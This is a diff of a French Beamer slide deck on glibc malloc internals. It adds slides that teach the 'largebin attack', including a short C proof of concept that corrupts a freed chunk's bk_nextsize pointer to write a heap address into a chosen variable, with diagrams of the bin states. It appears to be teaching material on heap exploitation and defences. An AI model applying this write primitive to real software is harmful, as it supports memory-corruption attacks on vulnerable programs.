@@ -63,11 +63,20 @@
     listing engine=minted,
     minted style=xcode,
     minted language=c,
-    minted options={fontsize=\footnotesize, breaklines, autogobble, escapeinside=@@},
+    minted options={
+        fontsize=\scriptsize,
+        breaklines,
+        breakanywhere,
+        autogobble,
+        escapeinside=@@,
+        linenos,
+        numbersep=5pt,
+        xleftmargin=0.7em
+    },
     colback=white,
-    colframe=black, % Contraste max
+    colframe=black,
     boxrule=1pt,
-    arc=0pt, % Coins carrés plus "terminal"
+    arc=0pt,
     left=6pt, right=4pt, top=4pt, bottom=4pt,
     drop shadow=black!30!white,
     listing only,
@@ -155,7 +164,7 @@
 \end{frame}
 
 
-\begin{frame}{C'est quoi malloc}
+\begin{frame}{C'est quoi malloc(1 /3)}
 
     \begin{center}
         \begin{tikzpicture}[
@@ -194,8 +203,7 @@
     \end{center}
 
 \end{frame}
-
-\begin{frame}{C'est quoi malloc}
+\begin{frame}{C'est quoi malloc(2 /3)}
 
     \begin{minipage}{0.40\textwidth}
         \begin{tikzpicture}[
@@ -238,10 +246,7 @@
 
 \end{frame}
 
-
-
-
-\begin{frame}{C'est quoi malloc}
+\begin{frame}{C'est quoi malloc(3 /3)}
 
     \begin{minipage}{0.40\textwidth}
         \begin{tikzpicture}[
@@ -504,15 +509,12 @@
 
         \begin{itemize}
             \item Liste \textbf{doublement chaînée FIFO}
-            \item + tri par taille via \texttt{fd\_nextsize} / \texttt{bk\_nextsize}
-            \item Tailles : \texttt{> 0x400}
-            \item Utilisés pour les grosses allocations
+            \item Tailles : \texttt{0x400} → \texttt{limite mmap (128ko)}
         \end{itemize}
 
     \end{minipage}
 
 \end{frame}
-
 
 \begin{frame}{Exemple largebins}
 
@@ -544,9 +546,9 @@
         % ===========================
         % Chunks
         % ===========================
-        \node[chunk, right=1.5cm of bin63] (A) {A : 0x480};
-        \node[chunk, right=1.5cm of bin64] (B) {B : 0x520};
-        \node[chunk, right=1.5cm of bin64b] (C) {C : 0x580};
+        \node[chunk, right=1cm of bin63] (A) {A : 0x480};
+        \node[chunk, right=1cm of bin64] (B) {B : 0x520};
+        \node[chunk, right=1cm of bin64b] (C) {C : 0x580};
 
         % ===========================
         %  boucles
@@ -583,11 +585,6 @@
     \end{tikzpicture}
 
 \end{frame}
-
-
-
-
-
 
 
 
@@ -827,13 +824,218 @@
     \end{ccode}
 \end{frame}
 
-\begin{frame}[fragile]{Largebin}
+\begin{frame}[fragile]{Largebin attack(1 /3)}
+    \begin{ccode}
+        int main(){
+                /* Disable IO buffering to prevent stream from interfering with heap */
+                setvbuf(stdin, NULL, _IONBF, 0);
+                setvbuf(stdout, NULL, _IONBF, 0);
+                setvbuf(stderr, NULL, _IONBF, 0);
+
+                size_t target = 0;
+                size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
+                size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
+
+                free(p1);
+                size_t *g3 = malloc(0x438);
+                free(p2);
+
+                p1[3] = (size_t)((&target) - 4); /* Overwrite metadata pointer */
+                size_t *g4 = malloc(0x438);
+                assert((size_t)(p2 - 2) == target);
+                return 0;
+            }
+    \end{ccode}
 \end{frame}
+
+\begin{frame}[fragile]{Largebin attack(2 /3)}
+    \begin{ccode}
+        int main(){
+                size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
+                size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
+
+                free(p1);
+                size_t *g3 = malloc(0x438);
+                free(p2);
+
+            }
+    \end{ccode}
+
+    \begin{tikzpicture}[
+        bin/.style={
+                rectangle, draw=black, thick,
+                minimum width=3.2cm,
+                minimum height=1cm,
+                align=center
+            },
+        chunk/.style={
+                rectangle, draw=black, thick,
+                minimum width=2.6cm,
+                minimum height=7mm,
+                align=center
+            },
+        fdarrow/.style={-{Latex[length=3mm]}, thick, blue},
+        nextarrow/.style={-{Latex[length=3mm]}, thick, dashed, red},
+        prevarrow/.style={-{Latex[length=3mm]}, thick, dashed, orange},
+        every node/.style={font=\small}
+        ]
+
+        % Bins
+        \visible<2-3>{\node[bin] (bin64) at (0,0) {Largebin 64\\0x400–0x4FF};}
+        \visible<1,3>{\node[bin, below=1.2cm of bin64] (unsorted) {Unsortedbin};}
+
+        % état intermédiare 1
+        \visible<1>{\node[chunk, right=1cm of unsorted] (p1) {p1 : 0x428};}
+        \visible<1>{\node[chunk, right=1cm of p1] (arena) {Arena};}
+
+        \visible<1>{\draw[fdarrow] (p1.east) -- (arena.west);}
+
+
+        % état intermédiare 2
+        \visible<2>{
+            \node[chunk, right=1cm of bin64] (p1) {p1 : 0x428};
+        }
+
+        % fd_nextsize : boucle à droite
+        \visible<2->{
+            \draw[nextarrow] (p1.east)
+            .. controls +(0.8,0.6) and +(0.8,-0.6)
+            .. (p1.east);
+        }
+
+        % bk_nextsize : boucle à gauche
+        \visible<2->{
+            \draw[prevarrow] (p1.west)
+            .. controls +(-0.8,0.6) and +(-0.8,-0.6)
+            .. (p1.west);
+        }
+
+
+        % état final
+        \visible<3>{\node[chunk, right=1cm of bin64] (p1) {p1 : 0x428};}
+        \visible<3>{\node[chunk, right=1cm of unsorted] (p2) {p2 : 0x418};}
+        \visible<3>{\node[chunk, right=1cm of p2] (arena) {Arena};}
+
+        \visible<3>{\draw[fdarrow] (p2.east) -- (arena.west);}
+
+    \end{tikzpicture}
+
+\end{frame}
+
+
+\begin{frame}[fragile]{Largebin attack(3 /3)}
+    \begin{ccode}
+        int main()
+        {
+                /* Overwrite metadata pointer */
+                p1[3] = (size_t)((&target) - 4);
+                size_t *g4 = malloc(0x438);
+            }
+    \end{ccode}
+
+    \begin{tikzpicture}[
+        bin/.style={
+                rectangle, draw=black, thick,
+                minimum width=3.2cm,
+                minimum height=1cm,
+                align=center
+            },
+        chunk/.style={
+                rectangle, draw=black, thick,
+                minimum width=2.6cm,
+                minimum height=7mm,
+                align=center
+            },
+        fdarrow/.style={-{Latex[length=3mm]}, thick, blue},
+        nextarrow/.style={-{Latex[length=3mm]}, thick, dashed, red},
+        prevarrow/.style={-{Latex[length=3mm]}, thick, dashed, orange},
+        every node/.style={font=\small}
+        ]
+
+        % ===========================
+        % BINS
+        % ===========================
+        \node[bin] (bin64) at (0,0) {Largebin 64\\0x400–0x4FF};
+        \visible<1-2>{\node[chunk, above=0.8cm of p1] (target) {target};}
+        \visible<1-2>{\node[bin, below=1.2cm of bin64] (unsorted) {Unsortedbin};}
+
+        % ===========================
+        % SLIDE 1–2 : état avant attaque
+        % ===========================
+
+        % p1 dans largebin (slide 1–2)
+        \visible<1-2>{
+            \node[chunk, right=1cm of bin64] (p1) {p1 : 0x428};
+        }
+
+        % p2 dans unsorted (slide 1–2)
+        \visible<1-2>{
+            \node[chunk, right=1cm of unsorted] (p2) {p2 : 0x418};
+            \node[chunk, right=1cm of p2] (arena) {Arena};
+            \draw[fdarrow] (p2.east) -- (arena.west);
+        }
+
+        % fd_nextsize boucle p1 (slide 1)
+        \visible<1>{
+            \draw[nextarrow] (p1.east)
+            .. controls +(0.8,0.6) and +(0.8,-0.6)
+            .. (p1.east);
+        }
+
+        \visible<1-2>{\draw[prevarrow] (p1.west)
+            .. controls +(-0.8,0.6) and +(-0.8,-0.6)
+            .. (p1.west);}
+
+        % corruption flèche p1 → target (slide 2)
+        \visible<2>{
+            \draw[nextarrow] (p1.north) -- (target.south)
+            node[midway, right]{overwrite fd\_nextsize};
+        }
+
+        % ===========================
+        % SLIDE 3 : état final après corruption
+        % ===========================
+
+        % p2 en bas du largebin
+        \visible<3>{
+            \node[chunk, right=1cm of bin64] (p2_3) {p2 : 0x418};
+        }
+
+        % p1 au milieu
+        \visible<3>{
+            \node[chunk, right=1cm of p2_3] (p1_3) {p1 : 0x428};
+        }
+
+        %target
+        \visible<3>{
+            \node[chunk, above=0.8cm of p2_3] (target_3) {\textbf{target = \&p2}};
+        }
+
+
+        % fd_next
+        \visible<3>{
+            \draw[nextarrow] ([yshift=3pt]p2_3.east) -- ([yshift=3pt]p1_3.west);
+            \draw[nextarrow] (p1_3.east)
+            .. controls +(0.8,0.6) and +(0.8,-0.6)
+            .. (p1_3.east);
+        }
+
+        %bk_next
+        \visible<3>{
+            \draw[prevarrow] ([yshift=-3pt]p1_3.west) -- ([yshift=-3pt]p2_3.east);
+            \draw[prevarrow] (p2_3.west)
+            .. controls +(-0.8,0.6) and +(-0.8,-0.6)
+            .. (p2_3.west);
+        }
+
+    \end{tikzpicture}
+
+\end{frame}
+
+
 
 \section{Défenses et Perspectives (4 min)}
 
-\begin{frame}{ASLR et Fuite d\'Adresses (Leacks)}
-\end{frame}
 
 \begin{frame}{Évolutions : GLIBC 2.42 \& 2.43}
     \textbf{GLIBC 2.42 (Août 2025)}
